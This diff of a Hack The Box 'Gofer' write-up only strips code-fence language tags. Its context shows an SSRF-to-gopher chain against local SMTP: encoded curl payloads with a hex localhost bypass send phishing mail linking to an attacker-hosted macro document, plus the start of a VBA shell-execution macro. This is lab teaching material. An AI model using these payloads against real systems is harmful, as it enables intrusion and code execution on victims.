@@ -10,7 +10,7 @@ Gofer is a hard difficulty Linux machine on [Hack The Box](https://.hackthebox.c
 
 As with every machine, let's start with an Nmap scan. I use my own Rust wrapper which you can find [here](https://github.com/qur1us/rustmap). Let's look at the results.
 
-```bash
+```
 Nmap scan report for 10.129.4.164
 Host is up (0.038s latency).
 
@@ -45,7 +45,7 @@ Since SMB is a bit unusual on Linux machines, let's begin with SMB enumeration. 
 
 We can begin by trying to list shares with null authentication.
 
-```bash
+```
 crackmapexec smb 10.129.4.164 -u '' -p '' --shares
 SMB         10.129.4.164    445    GOFER            [*] Windows 6.1 Build 0 (name:GOFER) (domain:htb) (signing:False) (SMBv1:False)
 SMB         10.129.4.164    445    GOFER            [+] htb\: 
@@ -60,7 +60,7 @@ SMB         10.129.4.164    445    GOFER            IPC$                        
 
 This has worked and we have read permissions on a share called `shares`. Let's take a look at it.
 
-```bash
+```
 smbclient -N \\\\10.129.4.164\\shares
 
 Try "help" to get a list of possible commands.
@@ -83,7 +83,7 @@ getting file \.backup\mail of size 1101 as mail (7.0 KiloBytes/sec) (average 7.0
 
 By examining the share we found an e-mail backup.
 
-```http
+```
 From jdavis@gofer.htb  Fri Oct 28 20:29:30 2022
 Return-Path: <jdavis@gofer.htb>
 X-Original-To: tbuckley@gofer.htb
@@ -120,7 +120,7 @@ We are welcomed with a simple web page where no links seem to be working. Not ev
 
 ### Fuzzing
 
-```bash
+```
 ➜  Gofer ffuf -u http://gofer.htb/ -H 'Host: FUZZ.gofer.htb' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fw 20
 
         /'___\  /'___\           /'___\       
@@ -170,7 +170,7 @@ We can use HTTP verb tampering to bypass the access restrictions and gain access
 
 We can see that the GET method is simply rejected with 401 Unauthorized.
 
-```bash
+```
 ➜  Gofer curl -i http://proxy.gofer.htb/index.php
 HTTP/1.1 401 Unauthorized
 Date: Sun, 30 Jul 2023 15:52:35 GMT
@@ -196,7 +196,7 @@ the credentials required.</p>
 
 However, if we change the HTTP method to `POST`, we can get around that restriction!
 
-```bash
+```
 ➜  Gofer curl -i -X POST http://proxy.gofer.htb/index.php                               
 HTTP/1.1 200 OK
 Date: Sun, 30 Jul 2023 15:59:31 GMT
@@ -233,7 +233,7 @@ Let's begin with something simple. As Jocelyn kindly clicks on links in e-mails,
 
 First, we have to create the malicious payload.
 
-```bash
+```
 gopher://127.0.0.1:25/xHELO gofer.htb
 MAIL FROM:<hacker@site.com>
 RCPT TO:<jhudson@gofer.htb>
@@ -253,7 +253,7 @@ QUIT
 
 We have to double URL encode and send this via `curl`.
 
-```bash
+```
 curl -i -X POST 'http://proxy.gofer.htb/index.php?url=gopher://127.0.0.1:25/xHELO%2520gofer.htb%250AMAIL%2520FROM:%253Chacker@site.com%253E%250ARCPT%2520TO:%253Cjhudson@gofer.htb%253E%250ADATA%250AFrom:%2520%255BHacker%255D%2520%253Chacker@site.com%253E%250ATo:%2520%253Cjhudson@gofer.htb%253E%250ADate:%2520Tue,%252015%2520Sep%25202017%252017:20:26%2520-0400%250ASubject:%2520AH%2520AH%2520AH%250A%250Ahttp://10.10.14.37/hello_from_jocelyn%250A%250A%250A.%250AQUIT%250d%250a'
 ```
 
@@ -265,7 +265,7 @@ We can represent the localhost IP address like this: `0x7f000001`
 
 Now, when we send the payload, we can see that we were successful.
 
-```bash
+```
 curl -i -X POST 'http://proxy.gofer.htb/index.php?url=gopher://0x7f000001:25/xHELO%20gofer.htb%250d%250aMAIL%20FROM:%3Chacker@site.com%3E%250d%250aRCPT%20TO:%3Cjhudson@gofer.htb%3E%250d%250aDATA%250d%250aFrom:%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo:%20%3Cjhudson@gofer.htb%3E%250d%250aDate:%20Tue,%2015%20Sep%202017%2017:20:26%20-0400%250d%250aSubject:%20AH%20AH%20AH%250d%250a%250d%250ahttp://10.10.14.37/hello_from_jocelyn%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a' 
 HTTP/1.1 200 OK
 Date: Sun, 30 Jul 2023 16:34:56 GMT
@@ -309,7 +309,7 @@ Here's what we are going to do:
 
 The macros are written in Visual Basic. The following snippet will execute a shell command specified in the `sCmd` variable.
 
-```vb
+```
 Sub Main()
     Dim sCmd As String
     Dim iRetVal As Integer
@@ -331,7 +331,7 @@ After the macro was created, we had to configure the document to auto run the ma
 
 To execute the payload we can again execute our SSRF > Gopher chain using curl.
 
-```bash
+```
 curl -i -X POST 'http://proxy.gofer.htb/index.php?url=gopher://0x7f000001:25/xHELO%20gofer.htb%250d%250aMAIL%20FROM:%3Chacker@site.com%3E%250d%250aRCPT%20TO:%3Cjhudson@gofer.htb%3E%250d%250aDATA%250d%250aFrom:%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo:%20%3Cjhudson@gofer.htb%3E%250d%250aDate:%20Tue,%2015%20Sep%202017%2017:20:26%20-0400%250d%250aSubject:%20AH%20AH%20AH%250d%250a%250d%250ahttp://10.10.14.37/output.odt%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a'
 ```
 
